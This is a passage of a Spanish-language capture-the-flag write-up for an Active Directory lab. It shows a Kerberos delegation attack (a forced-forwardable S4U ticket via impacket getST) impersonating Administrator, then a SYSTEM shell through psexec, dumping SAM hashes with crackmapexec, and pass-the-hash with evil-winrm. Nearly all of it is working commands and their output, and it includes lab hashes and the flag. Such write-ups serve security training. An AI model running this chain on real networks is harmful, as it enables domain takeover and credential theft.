jBwMFAEChAAClERgPMjAyMzA1MTkwNDIyMjhaphEYDzIwMjMwNTE5MTQyMjI4WqcRGA8yMDIzMDUyNjA0MjIyOFqoCxsJSFRCLkxPQ0FMqSAwHqADAgECoRcwFRsEY2lmcxsNd2ViLmh0Yi5sb2NhbA==  
+
+[+] Ticket successfully imported!
+
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con el ticket importado podemos leer la <code class="language-plaintext highlighter-rouge">flag</code> en <code class="language-plaintext highlighter-rouge">web.htb.local</code> en el recurso <code class="language-plaintext highlighter-rouge">C$</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">type </span><span class="p">\\web.htb.local\C$\Users\Administrator\Desktop\flag.txt  
+HADES{Why_llmnr_wh3n_y0u_got_adidns}
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Otra forma es tomar el <code class="language-plaintext highlighter-rouge">ticket</code> que nos devolvio <code class="language-plaintext highlighter-rouge">Rubeus</code> suplantando a Administrator y convertirlo de <code class="language-plaintext highlighter-rouge">kirbi</code> a <code class="language-plaintext highlighter-rouge">ccache</code>, despues exportarlo en la varible <code class="language-plaintext highlighter-rouge">KRB5CCNAME</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ base64</span><span class="p"> -d kirbi.b64 > ticket.kirbi
+
+</span><span class="ve">❯ impacket-ticketConverter </span><span class="p">ticket.kirbi WEB.ccache
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation  
+
+[*] converting kirbi to ccache...
+[+] done
+
+</span><span class="ve">❯ export </span><span class="p">KRB5CCNAME=WEB.ccache</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora usando el <code class="language-plaintext highlighter-rouge">ticket</code> como autenticacion podemos comprobar con <code class="language-plaintext highlighter-rouge">crackmapexec</code> hacia web.htb.local, el resultado es que es valida y devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec smb web.htb.local -k --use-kcache
+</span><span class="az">SMB         </span><span class="p">web.htb.local   445    WEB              </span><span class="az">[*] </span><span class="p">Windows Server 2012 R2 Standard 9600 x64 (name:WEB) (domain:htb.local) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">web.htb.local   445    WEB              </span><span class="ve">[+] </span><span class="p">htb.local\ from ccache </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Otra forma mas sencilla de general el ticket es con <code class="language-plaintext highlighter-rouge">getST</code> de impacket suplantando a <code class="language-plaintext highlighter-rouge">Administrator</code> y usando el parametro <code class="language-plaintext highlighter-rouge">-force-forwardable</code> para explotar el CVE</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q impacket-getST -spn cifs/web.htb.local -hashes :32ED87BDB5FDC5E9CBA88547376818D4 htb.local/attackersystem$ -impersonate Administrator -dc-ip dc1.htb.local -force-forwardable  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*]     Forcing the service ticket to be forwardable
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+
+</span><span class="ve">❯ export </span><span class="p">KRB5CCNAME=Administrator.ccache</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Este <code class="language-plaintext highlighter-rouge">ticket</code> tambien deberia ser valido para autenticarnos contra <code class="language-plaintext highlighter-rouge">web.htb.local</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec smb web.htb.local -k --use-kcache
+</span><span class="az">SMB         </span><span class="p">web.htb.local   445    WEB              </span><span class="az">[*] </span><span class="p">Windows Server 2012 R2 Standard 9600 x64 (name:WEB) (domain:htb.local) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">web.htb.local   445    WEB              </span><span class="ve">[+] </span><span class="p">htb.local\ from ccache </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando esa autenticacion ccache podemos con <code class="language-plaintext highlighter-rouge">psexec</code> obtener una shell en <code class="language-plaintext highlighter-rouge">web</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q impacket-psexec htb.local/Administrator@web.htb.local -k -no-pass  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on web.htb.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file vmkgFQEM.exe
+[*] Opening SVCManager on web.htb.local.....
+[*] Creating service fbps on web.htb.local.....
+[*] Starting service fbps.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32> </span><span class="am">hostname</span><span class="p">
+web
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">O con <code class="language-plaintext highlighter-rouge">crackmapexec</code> dumpear la <code class="language-plaintext highlighter-rouge">sam</code> del equipo, para asi poder ver los <code class="language-plaintext highlighter-rouge">hashes</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec smb web.htb.local -k --use-kcache --sam
+</span><span class="az">SMB         </span><span class="p">web.htb.local   445    WEB              </span><span class="az">[*] </span><span class="p">Windows Server 2012 R2 Standard 9600 x64 (name:WEB) (domain:htb.local) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">web.htb.local   445    WEB              </span><span class="ve">[+] </span><span class="p">htb.local\ from ccache </span><span class="am">(Pwn3d!)  
+</span><span class="az">SMB         </span><span class="p">web.htb.local   445    WEB              </span><span class="ve">[+] </span><span class="p">Dumping SAM hashes
+</span><span class="az">SMB         </span><span class="p">web.htb.local   445    WEB              </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:e57231f8ebcc24a122631564147361cc:::
+</span><span class="az">SMB         </span><span class="p">web.htb.local   445    WEB              </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">web.htb.local   445    WEB              </span><span class="ve">[+] </span><span class="p">Added </span><span class="am">2 </span><span class="p">SAM hashes to the database</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Simplemente nos conectamos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> haciendo un passthehash utilizando el <code class="language-plaintext highlighter-rouge">hash</code> NT de <code class="language-plaintext highlighter-rouge">Administrator</code> y obtenemos una powershell como el en <code class="language-plaintext highlighter-rouge">WEB</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q evil-winrm -i web.htb.local -u Administrator -H e57231f8ebcc24a122631564147361cc  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+web\administrator
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
 </section>
 
 </article>
